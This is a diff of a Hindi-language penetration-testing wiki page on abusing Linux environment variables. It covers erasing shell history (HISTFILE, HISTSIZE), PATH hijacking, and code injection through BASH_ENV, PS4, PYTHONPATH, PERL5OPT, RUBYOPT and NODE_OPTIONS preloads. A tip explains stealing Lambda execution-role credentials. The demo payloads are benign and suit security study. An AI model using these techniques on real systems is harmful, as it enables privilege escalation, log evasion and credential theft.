@@ -2,30 +2,37 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Global variables
+## ग्लोबल वैरिएबल
 
-**Global variables** को **child processes** विरासत में प्राप्त करेंगे।
+ग्लोबल वैरिएबल **चाइल्ड प्रोसेस** द्वारा इनहेरिट किए **जाएंगे**।
 
-आप यह करके अपने वर्तमान session के लिए एक global variable बना सकते हैं:
+आप अपने मौजूदा सेशन के लिए ग्लोबल वैरिएबल इस तरह बना सकते हैं:
+
 ```bash
 export MYGLOBAL="hello world"
 echo $MYGLOBAL #Prints: hello world
 ```
-यह variable आपके वर्तमान sessions और उनकी child processes द्वारा accessible होगा।
 
-आप यह करके किसी variable को **remove** कर सकते हैं:
+यह variable आपके मौजूदा sessions और उनकी child processes के लिए उपलब्ध होगा।
+
+आप किसी variable को इस तरह **हटा** सकते हैं:
+
 ```bash
 unset MYGLOBAL
 ```
+
 ## Local variables
 
-**local variables** को केवल **current shell/script** द्वारा **accessed** किया जा सकता है।
+**Local variables** को केवल **वर्तमान shell/script** द्वारा **access** किया जा सकता है।
+
 ```bash
 LOCAL="my local"
 echo $LOCAL
 unset LOCAL
 ```
+
 ## वर्तमान variables की सूची
+
 ```bash
 set
 env
@@ -33,54 +40,62 @@ printenv
 cat /proc/$$/environ
 cat /proc/`python -c "import os; print(os.getppid())"`/environ
 ```
-`/proc/*/environ` की सामग्री **NUL-separated** होती है, इसलिए ये variants आमतौर पर पढ़ने में आसान होते हैं:
+
+`/proc/*/environ` की सामग्री **NUL से अलग की गई** होती है, इसलिए इन रूपों को पढ़ना आमतौर पर आसान होता है:
+
 ```bash
 tr '\0' '\n' </proc/$$/environ | sort -u
 tr '\0' '\n' </proc/<PID>/environ | sort -u
 ```
-यदि आप inherited environments के अंदर **credentials** या **interesting service configuration** खोज रहे हैं, तो [Linux Post Exploitation](../post-exploitation/linux-post-exploitation/README.md) भी जांचें।
+
+यदि आप inherited environments के अंदर **credentials** या **interesting service configuration** खोज रहे हैं, तो [Linux Post Exploitation](../post-exploitation/README.md) भी देखें।
 
 ## सामान्य variables
 
 स्रोत: [https://geek-university.com/linux/common-environment-variables/](https://geek-university.com/linux/common-environment-variables/).<sup>[[5]](#references)</sup>
 
-- **DISPLAY** – **X** द्वारा उपयोग किया जाने वाला display। यह variable आमतौर पर **:0.0** पर set होता है, जिसका अर्थ वर्तमान computer पर पहला display है।
-- **EDITOR** – user का पसंदीदा text editor।
-- **HISTFILESIZE** – history file में मौजूद lines की अधिकतम संख्या।
-- **HISTSIZE** – user के अपना session समाप्त करने पर history file में जोड़ी जाने वाली lines की संख्या।
+- **DISPLAY** – **X** द्वारा उपयोग किया जाने वाला display। यह variable आमतौर पर **:0.0** पर सेट होता है, जिसका अर्थ है वर्तमान कंप्यूटर पर पहला display।
+- **EDITOR** – उपयोगकर्ता का पसंदीदा text editor।
+- **HISTFILESIZE** – history file में मौजूद अधिकतम lines की संख्या।
+- **HISTSIZE** – उपयोगकर्ता का session समाप्त होने पर history file में जोड़ी जाने वाली lines की संख्या।
 - **HOME** – आपकी home directory।
-- **HOSTNAME** – computer का hostname।
-- **LANG** – आपकी वर्तमान language।
-- **MAIL** – user के mail spool का स्थान। आमतौर पर **/var/spool/mail/USER**।
-- **MANPATH** – manual pages के लिए search की जाने वाली directories की सूची।
+- **HOSTNAME** – कंप्यूटर का hostname।
+- **LANG** – आपकी वर्तमान भाषा।
+- **MAIL** – उपयोगकर्ता के mail spool का स्थान। आमतौर पर **/var/spool/mail/USER**।
+- **MANPATH** – manual pages खोजने के लिए directories की सूची।
 - **OSTYPE** – operating system का प्रकार।
 - **PS1** – bash में default prompt।
-- **PATH** – उन सभी directories के paths store करता है जिनमें वे binary files होती हैं जिन्हें आप file का नाम निर्दिष्ट करके, relative या absolute path दिए बिना execute करना चाहते हैं।
+- **PATH** – उन सभी directories के paths संग्रहीत करता है जिनमें वे binary files होती हैं जिन्हें आप file का नाम देकर execute करना चाहते हैं, न कि relative या absolute path देकर।
 - **PWD** – वर्तमान working directory।
 - **SHELL** – वर्तमान command shell का path (उदाहरण के लिए, **/bin/bash**)।
 - **TERM** – वर्तमान terminal type (उदाहरण के लिए, **xterm**)।
 - **TZ** – आपका time zone।
 - **USER** – आपका वर्तमान username।
 
-## hacking के लिए interesting variables
+## hacking के लिए उपयोगी variables
 
-हर variable समान रूप से उपयोगी नहीं होता। Offensive perspective से उन variables को प्राथमिकता दें जो **search paths**, **startup files**, **dynamic linker behavior**, या **audit/logging** को बदलते हैं।
+हर variable समान रूप से उपयोगी नहीं होता। offensive दृष्टिकोण से, उन variables को प्राथमिकता दें जो **search paths**, **startup files**, **dynamic linker behavior**, या **audit/logging** को बदलते हैं।
 
 ### **HISTFILESIZE**
 
-**इस variable की value को 0 में बदलें**, ताकि जब आप **अपना session समाप्त करें**, तो **history file** (\~/.bash_history) **0 lines तक truncate हो जाए**।
+इस variable का **value 0 पर सेट करें**, ताकि जब आप **अपना session समाप्त करें**, तो **history file** (\~/.bash_history) में **0 lines** रह जाएँ।
+
 ```bash
 export HISTFILESIZE=0
 ```
+
 ### **HISTSIZE**
 
-इस variable की **value को 0 में बदलें**, ताकि commands **in-memory history में संग्रहीत न हों** और **history file** (\~/.bash_history) में वापस न लिखे जाएँ।
+इस variable का **value 0** करें, ताकि commands **in-memory history में न रखे जाएँ** और **history file** (\~/.bash_history) में वापस न लिखे जाएँ।
+
 ```bash
 export HISTSIZE=0
 ```
+
 ### **HISTCONTROL**
 
-यदि **इस variable की value `ignorespace` या `ignoreboth` पर set है**, तो आगे एक अतिरिक्त space वाली कोई भी command history में save नहीं की जाएगी।
+अगर **इस variable का value `ignorespace` या `ignoreboth` पर set है**, तो extra space के साथ शुरू होने वाला कोई भी command history में save नहीं होगा।
+
 ```bash
 export HISTCONTROL=ignorespace
 ```
@@ -89,40 +104,50 @@ export HISTCONTROL=ignorespace
 $ echo "to save or"
 $  echo "not to save"
 ```
+
 ### **HISTFILE**
 
-**history file** को **`/dev/null`** पर सेट करें या इसे पूरी तरह unset कर दें। यह आमतौर पर केवल history size बदलने की तुलना में अधिक विश्वसनीय होता है।
+**history file** को **`/dev/null`** पर सेट करें या इसे पूरी तरह unset कर दें। यह आमतौर पर केवल history size बदलने से अधिक भरोसेमंद होता है।
+
 ```bash
 export HISTFILE=/dev/null
 unset HISTFILE
 ```
+
 ### http_proxy & https_proxy
 
-**Processes** यहाँ घोषित **proxy** का उपयोग **http या https** के माध्यम से internet से connect करने के लिए करेंगे।
+प्रोसेस **http या https** के ज़रिए इंटरनेट से कनेक्ट होने के लिए यहाँ घोषित **proxy** का उपयोग करेंगे।
+
 ```bash
 export http_proxy="http://10.10.10.10:8080"
 export https_proxy="http://10.10.10.10:8080"
 ```
+
 ### all_proxy & no_proxy
 
-- `all_proxy`: उन tools/protocols के लिए default proxy जो इसे support करते हैं।
+- `all_proxy`: उन tools/protocols के लिए default proxy जो इसे मानते हैं।
 - `no_proxy`: उन hosts/domains/CIDRs की bypass list जिन्हें सीधे connect करना चाहिए।
+
 ```bash
 export all_proxy="socks5h://10.10.10.10:1080"
 export no_proxy="localhost,127.0.0.1,.corp.local,10.0.0.0/8"
 ```
-Tool के आधार पर lowercase और uppercase variants दोनों का उपयोग किया जा सकता है (`http_proxy`/`HTTP_PROXY`, `no_proxy`/`NO_PROXY`)।
+
+टूल के आधार पर lowercase और uppercase दोनों variants इस्तेमाल किए जा सकते हैं (`http_proxy`/`HTTP_PROXY`, `no_proxy`/`NO_PROXY`)।
 
 ### SSL_CERT_FILE & SSL_CERT_DIR
 
-Processes **इन env variables** में निर्दिष्ट certificates पर trust करेंगे। यह **`curl`**, **`git`**, Python HTTP clients या package managers जैसे tools को attacker द्वारा नियंत्रित CA पर trust कराने के लिए उपयोगी है (उदाहरण के लिए, interception proxy को legitimate दिखाने के लिए)।
+प्रोसेस **इन env variables** में बताए गए certificates पर भरोसा करेंगे। इससे **`curl`**, **`git`**, Python HTTP clients या package managers जैसे टूल्स को attacker के नियंत्रण वाले CA पर भरोसा करवाया जा सकता है (उदाहरण के लिए, interception proxy को वैध दिखाने के लिए)।
+
 ```bash
 export SSL_CERT_FILE=/path/to/ca-bundle.pem
 export SSL_CERT_DIR=/path/to/ca-certificates
 ```
+
 ### **PATH**
 
-यदि कोई privileged wrapper/script commands को **absolute paths** के बिना execute करता है, तो `PATH` में मौजूद **पहली attacker-controlled directory** जीतती है। यही `sudo`, cron jobs, shell wrappers और custom SUID helpers में होने वाले कई **PATH hijacks** का primitive है। `env_keep+=PATH`, कमजोर `secure_path`, या ऐसे wrappers खोजें जो `tar`, `service`, `cp`, `python` आदि को नाम से call करते हैं।
+अगर कोई privileged wrapper/script **absolute paths के बिना** commands execute करता है, तो `PATH` में मौजूद **पहली attacker-controlled directory** प्रभावी होती है। `sudo`, cron jobs, shell wrappers और custom SUID helpers में होने वाले कई **PATH hijacks** के पीछे यही तरीका है। `env_keep+=PATH`, कमजोर `secure_path`, या ऐसे wrappers देखें जो `tar`, `service`, `cp`, `python` आदि को नाम से call करते हैं।
+
 ```bash
 mkdir -p /dev/shm/bin
 cat > /dev/shm/bin/tar <<'EOF'
@@ -133,53 +158,65 @@ EOF
 chmod +x /dev/shm/bin/tar
 PATH=/dev/shm/bin:$PATH vulnerable-wrapper
 ```
-पूर्ण privilege-escalation chains के लिए जो `PATH` का दुरुपयोग करती हैं, [Linux Privilege Escalation](linux-privilege-escalation/README.md) देखें।
+
+`PATH` का दुरुपयोग करने वाली पूरी privilege-escalation chains के लिए, [Linux Privilege Escalation](linux-privilege-escalation/README.md) देखें।
 
 ### **HOME & XDG_CONFIG_HOME**
 
-`HOME` केवल directory reference नहीं है: कई tools `$HOME` या `$XDG_CONFIG_HOME` से **dotfiles**, **plugins**, और **per-user configuration** को automatically load करते हैं। यदि कोई privileged workflow इन values को preserve करता है, तो **config injection**, binary hijacking की तुलना में आसान हो सकता है।
+`HOME` केवल directory reference नहीं है: कई tools `$HOME` या `$XDG_CONFIG_HOME` से **dotfiles**, **plugins**, और **per-user configuration** अपने आप load करते हैं। अगर कोई privileged workflow इन values को बनाए रखता है, तो **config injection** करना binary hijacking से आसान हो सकता है।
+
 ```bash
 export HOME=/dev/shm/fakehome
 export XDG_CONFIG_HOME=/dev/shm/fakehome/.config
 mkdir -p "$XDG_CONFIG_HOME"
 ```
-रोचक targets में `.gitconfig`, `.wgetrc`, `.curlrc`, `.inputrc`, `.pythonrc.py`, और `.terraformrc` जैसी tool-specific files शामिल हैं।
+
+दिलचस्प targets में `.gitconfig`, `.wgetrc`, `.curlrc`, `.inputrc`, `.pythonrc.py` और `.terraformrc` जैसी tool-specific files शामिल हैं।
 
 ### **LD_PRELOAD, LD_LIBRARY_PATH & LD_AUDIT**
 
 ये variables **dynamic linker** को प्रभावित करते हैं:
 
-- `LD_PRELOAD`: अतिरिक्त shared objects को पहले load करने के लिए बाध्य करता है।
+- `LD_PRELOAD`: अतिरिक्त shared objects को सबसे पहले load करने के लिए बाध्य करता है।
 - `LD_LIBRARY_PATH`: library search directories को सबसे आगे जोड़ता है।
 - `LD_AUDIT`: ऐसी auditor libraries load करता है जो library loading और symbol resolution पर नज़र रखती हैं।
 
-यदि कोई privileged command इन्हें बनाए रखता है, तो ये **hooking**, **instrumentation**, और **privilege escalation** के लिए बेहद उपयोगी होते हैं। **secure-execution** mode (`AT_SECURE`, जैसे setuid/setgid/capabilities) में loader इनमें से कई variables को हटा देता है या उन पर प्रतिबंध लगा देता है। हालांकि, उस शुरुआती loader stage में मौजूद parser bugs का प्रभाव फिर भी बहुत गंभीर होता है, क्योंकि वे target program से **पहले** run होते हैं।<sup>[[2]](#references)</sup>
+यदि कोई privileged command इन्हें बनाए रखती है, तो ये **hooking**, **instrumentation** और **privilege escalation** के लिए बेहद उपयोगी हैं। **secure-execution** mode (`AT_SECURE`, जैसे setuid/setgid/capabilities) में loader इनमें से कई variables को हटा देता है या उन पर पाबंदी लगाता है। हालांकि, loader के इस शुरुआती चरण में parser bugs अब भी गंभीर प्रभाव डाल सकते हैं, क्योंकि यह target program से **पहले** चलते हैं।<sup>[[2]](#references)</sup>
+
 ```bash
 env | grep -E '^LD_'
 ldso=$(ls /lib64/ld-linux-*.so.* /lib/*-linux-gnu/ld-linux-*.so.* 2>/dev/null | head -n1)
 "$ldso" --list-diagnostics /bin/true | head
 "$ldso" --list-tunables /bin/true | head
 ```
+
 ### **GLIBC_TUNABLES**
 
-`GLIBC_TUNABLES` glibc के शुरुआती व्यवहार (उदाहरण के लिए, allocator tunables) को बदलता है और exploit labs में बहुत उपयोगी है। यह security के दृष्टिकोण से भी महत्वपूर्ण है, क्योंकि **dynamic loader इसे बहुत जल्दी parse करता है**। 2023 का **Looney Tunables** bug इस बात की अच्छी याद दिलाता है कि loader में parse होने वाला एक अकेला environment variable SUID programs के विरुद्ध **local privilege-escalation primitive** बन सकता है।<sup>[[6]](#references)</sup>
+`GLIBC_TUNABLES` शुरुआती glibc व्यवहार (उदाहरण के लिए, allocator tunables) को बदलता है और exploit labs में बहुत उपयोगी है। सुरक्षा के नज़रिए से भी यह महत्वपूर्ण है, क्योंकि **dynamic loader इसे बहुत शुरुआती चरण में parse करता है**। 2023 का **Looney Tunables** bug इस बात की अच्छी याद दिलाता है कि loader में parse किया गया एक environment variable, SUID programs के विरुद्ध **local privilege-escalation primitive** बन सकता है।<sup>[[6]](#references)</sup>
+
+CVE-2023-4911 के लिए, **installed distribution package release** की तुलना उसके vendor की fixed release से करें और सत्यापित करें कि नए processes के लिए वास्तव में कौन-सा loader इस्तेमाल हो रहा है। केवल upstream version string पर भरोसा नहीं किया जा सकता: Debian ने प्रभावित parser को अपने 2.31 package में backport किया था, जबकि distributions ने upstream number बदले बिना fixes backport किए। किसी व्यावहारिक privilege transition के लिए एक executable privileged target भी चाहिए, जिसकी identity में बदलाव `NoNewPrivs`, `nosuid` mount या किसी अन्य mitigation से अवरुद्ध न हो। Passive enumeration के दौरान malformed `GLIBC_TUNABLES` crash probe चलाने से बचें। Release-विशिष्ट applicability के लिए [Ubuntu tracker](https://ubuntu.com/security/CVE-2023-4911), [Debian tracker](https://security-tracker.debian.org/tracker/CVE-2023-4911) और [Red Hat advisory](https://access.redhat.com/security/cve/cve-2023-4911) देखें; Ubuntu का [security notice](https://ubuntu.com/security/notices/USN-6409-1) अपडेट के बाद reboot करने की सलाह भी देता है।
+
 ```bash
 GLIBC_TUNABLES=glibc.malloc.tcache_count=0 ./binary
 ```
+
 ### **BASH_ENV & ENV**
 
-यदि **Bash** को **non-interactively** शुरू किया जाता है, तो यह `BASH_ENV` की जाँच करता है और target script चलाने से पहले उस फ़ाइल को source करता है। जब Bash को `sh` के रूप में, या POSIX-style interactive mode में invoke किया जाता है, तो `ENV` से भी consult किया जा सकता है। यदि environment attacker-controlled हो, तो यह shell wrapper को code execution में बदलने का एक classic तरीका है।
+अगर **Bash** को **non-interactively** शुरू किया जाता है, तो वह `BASH_ENV` की जाँच करता है और target script चलाने से पहले उस फ़ाइल को source करता है। जब Bash को `sh` के रूप में invoke किया जाता है, या POSIX-style interactive mode में चलाया जाता है, तब `ENV` से भी जाँच की जा सकती है। अगर environment attacker के नियंत्रण में हो, तो यह shell wrapper को code execution में बदलने का एक पारंपरिक तरीका है।
+
 ```bash
 cat > /tmp/pre.sh <<'EOF'
 echo '[+] sourced before the target script'
 EOF
 BASH_ENV=/tmp/pre.sh bash -c 'echo target'
 ```
-Bash इन startup files को तब अनदेखा करता है जब **real/effective IDs अलग होते हैं**; `-p` effective ID को बनाए रखता है, लेकिन उन startup files को सक्षम नहीं करता, इसलिए सटीक behavior इस बात पर निर्भर करता है कि wrapper shell को कैसे invoke करता है। उन privileged wrappers से सावधान रहें जो Bash लॉन्च करने **से पहले** `setuid()`/`setgid()` call करते हैं: IDs के फिर से match होने के बाद, Bash `BASH_ENV`, `ENV` और संबंधित shell state पर भरोसा कर सकता है, जिन्हें वह अन्यथा अनदेखा करता।<sup>[[1]](#references)</sup>
+
+Bash इन startup files को तब अनदेखा करता है जब **real/effective IDs अलग हों**; `-p` effective ID को बनाए रखता है, लेकिन उन startup files को सक्षम नहीं करता, इसलिए सटीक व्यवहार इस बात पर निर्भर करता है कि wrapper shell को कैसे चलाता है। ऐसे privileged wrappers से सावधान रहें जो Bash लॉन्च करने से **पहले** `setuid()`/`setgid()` चलाते हैं: IDs के फिर से समान हो जाने पर Bash, `BASH_ENV`, `ENV` और संबंधित shell state पर भरोसा कर सकता है, जिन्हें वह अन्यथा अनदेखा करता।<sup>[[1]](#references)</sup>
 
 ### **PS4 + SHELLOPTS (xtrace)**
 
-जब Bash **xtrace** enabled के साथ चलता है, तो वह `PS4` को expand करता है और हर traced command से पहले उसे print करता है। `PS4` को prompt की तरह expand किया जाता है, इसलिए इसके अंदर मौजूद **command substitution** execute होती है। महत्वपूर्ण रूप से, `SHELLOPTS=xtrace` export करके xtrace को पूरी तरह environment से enable किया जा सकता है — command line पर `-x` की आवश्यकता नहीं होती — इसलिए victim द्वारा चलायी गई कोई भी Bash script code execution बन जाती है।<sup>[[7]](#references)</sup>
+जब Bash में **xtrace** सक्षम होता है, तो यह हर trace किए गए command से पहले `PS4` को expand करके प्रिंट करता है। `PS4` को prompt की तरह expand किया जाता है, इसलिए इसके अंदर मौजूद **command substitution** execute होता है। अहम बात यह है कि `SHELLOPTS=xtrace` export करके xtrace को सीधे environment से सक्षम किया जा सकता है — command line पर `-x` की ज़रूरत नहीं होती — इसलिए victim द्वारा चलाई गई कोई भी Bash script code execution बन जाती है।<sup>[[7]](#references)</sup>
+
 ```bash
 echo 'echo target' > /tmp/victim.sh
 
@@ -190,7 +227,8 @@ cat /tmp/ps4-executed
 # Same primitive when a job is run with debugging enabled
 PS4='$(touch /tmp/ps4-x)' bash -x /tmp/victim.sh
 ```
-`PS4` तब तक कुछ नहीं करता जब तक xtrace सक्रिय न हो (`SHELLOPTS=xtrace`, `set -x` या `bash -x`), और Bash privileged/setuid contexts में `BASH_ENV` की तरह `SHELLOPTS` को हटा देता है।
+
+`PS4` तब तक कुछ नहीं करता जब तक xtrace सक्रिय न हो (`SHELLOPTS=xtrace`, `set -x` या `bash -x`); और Bash privileged/setuid contexts में `BASH_ENV` की तरह ही `SHELLOPTS` को हटा देता है।
 
 ### **PYTHONPATH, PYTHONHOME, PYTHONSTARTUP, PYTHONINSPECT & PYTHONBREAKPOINT**
 
@@ -198,11 +236,12 @@ PS4='$(touch /tmp/ps4-x)' bash -x /tmp/victim.sh
 
 - `PYTHONPATH`: import search paths को आगे जोड़ता है।
 - `PYTHONHOME`: standard library tree का स्थान बदलता है।
-- `PYTHONSTARTUP`: interactive prompt से पहले एक file execute करता है।
-- `PYTHONINSPECT=1`: script पूरा होने के बाद interactive mode में चला जाता है।
-- `PYTHONBREAKPOINT`: जब code `breakpoint()` तक पहुंचता है, तब `package.module.callable` को invoke करता है (और उसके module को import करता है)।<sup>[[8]](#references)</sup>
+- `PYTHONSTARTUP`: interactive prompt से पहले एक file चलाता है।
+- `PYTHONINSPECT=1`: script के समाप्त होने के बाद interactive mode में चला जाता है।
+- `PYTHONBREAKPOINT`: code के `breakpoint()` तक पहुंचने पर `package.module.callable` को invoke करता है (और उसका module import करता है)।<sup>[[8]](#references)</sup>
 
-ये उन maintenance scripts, debuggers, shells और wrappers के विरुद्ध उपयोगी हैं जो controllable environment के साथ Python को call करते हैं। `python -E` और `python -I` सभी `PYTHON*` variables को ignore करते हैं।
+ये maintenance scripts, debuggers, shells और wrappers के विरुद्ध उपयोगी हैं, जो controllable environment के साथ Python को call करते हैं। `python -E` और `python -I` सभी `PYTHON*` variables को अनदेखा करते हैं।
+
 ```bash
 mkdir -p /tmp/pylib
 printf 'print("owned from PYTHONPATH")\n' > /tmp/pylib/htmod.py
@@ -213,16 +252,22 @@ PYTHONPATH=/tmp/pylib python3 -I -c 'import htmod'   # ignored in isolated mode
 printf 'import sys\nbreakpoint(*sys.argv[1:])\n' > /tmp/bp.py
 PYTHONBREAKPOINT='os.system' python3 /tmp/bp.py 'id'   # requires the code to hit breakpoint()
 ```
-हाल का एक वास्तविक उदाहरण Ubuntu/Debian systems पर 2024 का **needrestart** LPE था: root-owned scanner ने `/proc/<PID>/environ` से unprivileged process का `PYTHONPATH` कॉपी किया और फिर Python execute किया। प्रकाशित exploit ने attacker-controlled path में `importlib/__init__.so` रखा, ताकि Python अपने initialization के दौरान attacker code execute करे, इससे पहले कि helper की hard-coded script का कोई महत्व हो।<sup>[[3]](#references)</sup>
+
+वास्तविक दुनिया का एक हालिया उदाहरण Ubuntu/Debian systems पर 2024 का **needrestart** LPE था: root-owned scanner ने `/proc/<PID>/environ` से unprivileged process का `PYTHONPATH` कॉपी किया और फिर Python चलाया। प्रकाशित exploit ने attacker-controlled path में `importlib/__init__.so` रखा, ताकि Python अपने initialization के दौरान attacker code चलाए—इससे पहले कि helper की hard-coded script का कोई महत्व होता।<sup>[[3]](#references)</sup>
 
 ### **PERL5OPT & PERL5LIB**
 
-Perl में भी startup variables उतने ही उपयोगी हैं:
+Perl में startup के लिए उतने ही उपयोगी variables हैं:
 
-- `PERL5LIB`: library directories को prepend करता है।
-- `PERL5OPT`: switches को ऐसे inject करता है, जैसे वे हर `perl` command line पर मौजूद हों।
+- `PERL5LIB`: library directories को शुरुआत में जोड़ता है।
+- `PERL5OPT`: ऐसे switches जोड़ता है, मानो वे हर `perl` command line में दिए गए हों।
 
-इससे **automatic module loading** को force किया जा सकता है या target script के कोई महत्वपूर्ण कार्य करने से पहले interpreter behavior बदला जा सकता है। Perl इन variables को **taint / setuid / setgid** contexts में ignore करता है, लेकिन सामान्य root-run wrappers, CI jobs, installers और custom sudoers rules के लिए इनका अभी भी बहुत महत्व है।
+इससे **automatic module loading** हो सकती है या target script के कुछ भी दिलचस्प करने से पहले interpreter का व्यवहार बदल सकता है। **taint / setuid / setgid** contexts में Perl इन variables को अनदेखा करता है, लेकिन सामान्य root-run wrappers, CI jobs, installers और custom sudoers rules के लिए ये अब भी बहुत मायने रखते हैं।
+
+अगर कोई sudo rule environment overrides की अनुमति देता है और उसका privileged command अंततः Perl चलाता है, तो `PERL5DB` की भी जाँच करें। Perl के documentation के अनुसार, `PERL5OPT=-d` debugger शुरू करता है और जब Perl को bare `-d` switch के साथ शुरू किया जाता है, तब `PERL5DB` debugger initialization code देता है। केवल `PERL5LIB` और `PERLLIB` को unset करने से यह रास्ता बंद नहीं होता। ये variables sudo और wrapper से होकर आगे पहुँचने चाहिए, और Perl को taint या set-ID handling के ज़रिए इन्हें अनदेखा नहीं करना चाहिए; enumeration के दौरान privileged helper चलाए बिना सटीक rule और execution chain की जाँच करें। देखें [perlrun's environment-variable reference](https://perldoc.perl.org/perlrun#ENVIRONMENT)।
+
+Perl का built-in [`@INC` search path](https://perldoc.perl.org/perlvar#@INC) भी module trust boundary है, भले ही environment variables संरक्षित न हों। किसी privileged Perl process के लिए, वास्तविक `use` या `require` statement को resolved module name, search order और searched directory के अंतर्गत उस module को बनाने या बदलने की lower-privileged user की क्षमता से जोड़कर देखें। केवल library directory का writable होना यह साबित नहीं करता कि privileged process वहाँ से code लोड करेगा।
+
 ```bash
 mkdir -p /tmp/perllib
 cat > /tmp/perllib/HT.pm <<'EOF'
@@ -232,23 +277,27 @@ BEGIN { print "PERL5OPT_TRIGGERED\n" }
 EOF
 PERL5LIB=/tmp/perllib PERL5OPT=-MHT perl -e 'print "target\n"'
 ```
+
 ### **NODE_OPTIONS**
 
-`NODE_OPTIONS` environment को inherit करने वाली हर `node` process में **Node.js CLI flags** जोड़ता है। इसलिए यह wrappers, CI jobs, Electron helpers और उन sudo rules के विरुद्ध उपयोगी है जो अंततः Node को invoke करते हैं। Offensive दृष्टिकोण से सबसे दिलचस्प flags आमतौर पर ये होते हैं:
+`NODE_OPTIONS` उन सभी `node` processes में **Node.js CLI flags** को पहले जोड़ता है, जो environment को inherit करते हैं। इससे यह उन wrappers, CI jobs, Electron helpers और sudo rules के विरुद्ध उपयोगी हो जाता है, जो अंततः Node चलाते हैं। Offensive दृष्टि से सबसे दिलचस्प flags आमतौर पर ये होते हैं:
 
-- `--require <file>`: target script से पहले एक CommonJS file को preload करता है।
-- `--import <module>`: target script से पहले एक ES module को preload करता है।
+- `--require <file>`: target script से पहले एक CommonJS file preload करें।
+- `--import <module>`: target script से पहले एक ES module preload करें।
 
-Node कुछ dangerous flags को `NODE_OPTIONS` में अस्वीकार करता है, लेकिन `--require` और `--import` को स्पष्ट रूप से अनुमति है और इन्हें regular command-line arguments से **पहले** process किया जाता है।<sup>[[4]](#references)</sup>
+Node, `NODE_OPTIONS` में कुछ खतरनाक flags को अस्वीकार करता है, लेकिन `--require` और `--import` को स्पष्ट रूप से अनुमति है और इन्हें नियमित command-line arguments से **पहले** process किया जाता है।<sup>[[4]](#references)</sup>
+
 ```bash
 cat > /tmp/preload.js <<'EOF'
 console.error('[+] NODE_OPTIONS preload reached')
 EOF
 NODE_OPTIONS='--require /tmp/preload.js' node -e 'console.log("target")'
 ```
+
 #### `data:` URL के साथ Fileless preload
 
-जब आप `NODE_OPTIONS` सेट कर सकते हैं लेकिन target पर **file write नहीं कर सकते** (read-only filesystem, restricted API, serverless runtime आदि), तो `--import` एक `data:text/javascript,` URL स्वीकार करता है, इसलिए पूरा payload स्वयं environment variable के अंदर रहता है। JavaScript को **पूरी तरह URL-encoded** होना चाहिए — Node value को URL के रूप में parse करता है, इसलिए कोई भी raw space (या अन्य unencoded character) payload को truncate कर देता है और `SyntaxError` उत्पन्न करता है। यह Node 20.6+ पर काम करता है, जहाँ `--import` `NODE_OPTIONS` allowlist में है।<sup>[[4]](#references)</sup>
+जब आप `NODE_OPTIONS` सेट कर सकते हैं, लेकिन target पर **फ़ाइल नहीं लिख सकते** (read-only filesystem, restricted API, serverless runtime आदि), तो `--import` एक `data:text/javascript,` URL स्वीकार करता है, इसलिए पूरा payload environment variable के अंदर ही रहता है। JavaScript को **पूरी तरह URL-encoded** होना चाहिए — Node इस value को URL के रूप में parse करता है, इसलिए कोई भी raw space (या अन्य unencoded char) payload को truncate कर देता है और `SyntaxError` देता है। यह Node 20.6+ पर काम करता है, जहाँ `--import`, `NODE_OPTIONS` allowlist में है।<sup>[[4]](#references)</sup>
+
 ```bash
 # fileless proof of execution (note: no raw spaces in the data URL)
 NODE_OPTIONS='--import data:text/javascript,console.log(%22fileless_preload%22)' node -e 'console.log("target")'
@@ -262,42 +311,48 @@ PY
 )
 NODE_OPTIONS="$PAYLOAD" node -e 'console.log("target")'
 ```
-> [!TIP]
-> यह **managed cloud runtimes** में `NODE_OPTIONS` के control को RCE में बदलने का एक सामान्य तरीका है, जहां functions Node चलाते हैं। उदाहरण के लिए, कोई attacker जो केवल Lambda का configuration बदल सकता है (`lambda:UpdateFunctionConfiguration`, `iam:PassRole` नहीं और code update नहीं), वह `NODE_OPTIONS=--import data:text/javascript,<payload>` inject करके function के अंदर code चला सकता है और उसके execution-role credentials चुरा सकता है। Inject किया गया module **handler** से पहले चलता है, जिसके बाद handler सामान्य रूप से execute होता रहता है।
 
-उन remote gadget chains के लिए जो `NODE_OPTIONS` को indirectly set करती हैं (उदाहरण के लिए, prototype-pollution से RCE), [इस दूसरे पेज](../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce.md) को देखें।
+> [!TIP]
+> `NODE_OPTIONS` पर नियंत्रण को **managed cloud runtimes** में RCE में बदलने का यह एक आम तरीका है, जहाँ functions Node चलाते हैं। उदाहरण के लिए, कोई attacker जो केवल Lambda का configuration बदल सकता है (`lambda:UpdateFunctionConfiguration`, `iam:PassRole` नहीं, code update नहीं), `NODE_OPTIONS=--import data:text/javascript,<payload>` inject करके function के अंदर code चला सकता है और उसके execution-role credentials चुरा सकता है। Inject किया गया module handler से **पहले** चलता है, जिसके बाद handler सामान्य रूप से चलता है।
+
+ऐसी remote gadget chains के लिए जो `NODE_OPTIONS` को अप्रत्यक्ष रूप से सेट करती हैं (उदाहरण के लिए, prototype-pollution से RCE), [यह अन्य पेज](../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce.md) देखें।
 
 ### **RUBYLIB & RUBYOPT**
 
-Ruby startup abuse की यही श्रेणी उपलब्ध कराता है:
+Ruby में startup abuse का यही तरीका उपलब्ध है:
 
-- `RUBYLIB`: Ruby के load path में directories को prepend करता है।
+- `RUBYLIB`: Ruby के load path में directories को सबसे आगे जोड़ता है।
 - `RUBYOPT`: हर `ruby` invocation में `-r` जैसे command-line options inject करता है।
+
 ```bash
 mkdir -p /tmp/rubylib
 printf 'warn "[+] RUBYOPT preload reached"\n' > /tmp/rubylib/ht.rb
 RUBYLIB=/tmp/rubylib RUBYOPT='-rht' ruby -e 'puts :target'
 ```
-2024 की **needrestart** vulnerabilities ने दिखाया कि यह केवल lab trick नहीं है: वही root-owned helper जो `PYTHONPATH` abuse के प्रति vulnerable था, attacker-controlled `RUBYLIB` के साथ Ruby चलाने के लिए भी मजबूर किया जा सकता था, जिससे attacker directory से `enc/encdb.so` load होती थी।<sup>[[3]](#references)</sup>
+
+2024 की **needrestart** vulnerabilities ने दिखाया कि यह सिर्फ़ lab trick नहीं है: वही root-owned helper, जो `PYTHONPATH` के दुरुपयोग के प्रति vulnerable था, उसे attacker-controlled `RUBYLIB` के साथ Ruby चलाने के लिए भी मजबूर किया जा सकता था, जिससे attacker की directory से `enc/encdb.so` लोड हो जाता था।<sup>[[3]](#references)</sup>
 
 ### **VIMINIT & EXINIT**
 
